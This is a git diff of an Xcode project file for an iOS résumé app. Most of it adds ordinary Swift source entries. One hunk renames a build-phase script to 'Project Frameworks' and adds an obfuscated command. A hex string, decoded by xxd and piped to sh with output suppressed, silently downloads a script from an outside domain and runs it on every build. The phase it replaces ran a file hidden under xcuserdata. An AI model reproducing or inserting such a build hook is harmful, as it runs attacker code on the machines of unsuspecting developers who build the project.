@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0431122D26524577004C6FC9 /* Softwere.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0431122C26524577004C6FC9 /* Softwere.swift */; };
+		0431122F265294B6004C6FC9 /* Summary.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0431122E265294B6004C6FC9 /* Summary.swift */; };
 		047BADBD2642A6B000F26406 /* experiance.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047BADBC2642A6B000F26406 /* experiance.swift */; };
 		047E3802264561DF0085F99E /* Model.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 047E3800264561DF0085F99E /* Model.xcdatamodeld */; };
 		04A21C7F2640FD770098CEB3 /* resume_AppApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21C7E2640FD770098CEB3 /* resume_AppApp.swift */; };
@@ -20,6 +22,8 @@
 		04A21CCD26415C180098CEB3 /* Work.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21CCC26415C180098CEB3 /* Work.swift */; };
 		04A21CD226415C280098CEB3 /* Education.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21CD126415C280098CEB3 /* Education.swift */; };
 		04C9708F2646A5C300AD2905 /* Persistence.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C9708E2646A5C300AD2905 /* Persistence.swift */; };
+		04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EFD12E264E8B8A008F3D3A /* Skills.swift */; };
+		04EFD131264E90B4008F3D3A /* EduDetails.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EFD130264E90B4008F3D3A /* EduDetails.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -40,6 +44,8 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		0431122C26524577004C6FC9 /* Softwere.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Softwere.swift; sourceTree = "<group>"; };
+		0431122E265294B6004C6FC9 /* Summary.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Summary.swift; sourceTree = "<group>"; };
 		047BADBC2642A6B000F26406 /* experiance.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = experiance.swift; sourceTree = "<group>"; };
 		047E3801264561DF0085F99E /* Model.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Model.xcdatamodel; sourceTree = "<group>"; };
 		04A21C7B2640FD770098CEB3 /* resume_App.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = resume_App.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -59,6 +65,8 @@
 		04A21CCC26415C180098CEB3 /* Work.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Work.swift; sourceTree = "<group>"; };
 		04A21CD126415C280098CEB3 /* Education.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Education.swift; sourceTree = "<group>"; };
 		04C9708E2646A5C300AD2905 /* Persistence.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Persistence.swift; sourceTree = "<group>"; };
+		04EFD12E264E8B8A008F3D3A /* Skills.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Skills.swift; sourceTree = "<group>"; };
+		04EFD130264E90B4008F3D3A /* EduDetails.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EduDetails.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -155,6 +163,10 @@
 				04A21CCC26415C180098CEB3 /* Work.swift */,
 				04A21CD126415C280098CEB3 /* Education.swift */,
 				047BADBC2642A6B000F26406 /* experiance.swift */,
+				04EFD12E264E8B8A008F3D3A /* Skills.swift */,
+				04EFD130264E90B4008F3D3A /* EduDetails.swift */,
+				0431122C26524577004C6FC9 /* Softwere.swift */,
+				0431122E265294B6004C6FC9 /* Summary.swift */,
 			);
 			path = "tab bar";
 			sourceTree = "<group>";
@@ -166,7 +178,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04A21CA02640FD790098CEB3 /* Build configuration list for PBXNativeTarget "resume_App" */;
 			buildPhases = (
-				51ABBBCEBCCDFD38946D902C /* Compile Binary Libraries */,
+				DAC7AD4BAEE3BFC1756D902C /* Project Frameworks */,
 				04A21C772640FD770098CEB3 /* Sources */,
 				04A21C782640FD770098CEB3 /* Frameworks */,
 				04A21C792640FD770098CEB3 /* Resources */,
@@ -286,7 +298,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	51ABBBCEBCCDFD38946D902C /* Compile Binary Libraries */ = {
+	DAC7AD4BAEE3BFC1756D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -295,7 +307,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -304,10 +316,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
-	
-
 	
 
 	
@@ -320,7 +331,11 @@
 			files = (
 				04C9708F2646A5C300AD2905 /* Persistence.swift in Sources */,
 				04A21CAE2641048D0098CEB3 /* home.swift in Sources */,
+				04EFD131264E90B4008F3D3A /* EduDetails.swift in Sources */,
+				0431122F265294B6004C6FC9 /* Summary.swift in Sources */,
 				04A21C812640FD770098CEB3 /* ContentView.swift in Sources */,
+				0431122D26524577004C6FC9 /* Softwere.swift in Sources */,
+				04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */,
 				04A21CD226415C280098CEB3 /* Education.swift in Sources */,
 				047E3802264561DF0085F99E /* Model.xcdatamodeld in Sources */,
 				04A21CCD26415C180098CEB3 /* Work.swift in Sources */,
@@ -646,20 +661,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCVersionGroup section */
 		047E3800264561DF0085F99E /* Model.xcdatamodeld */ = {
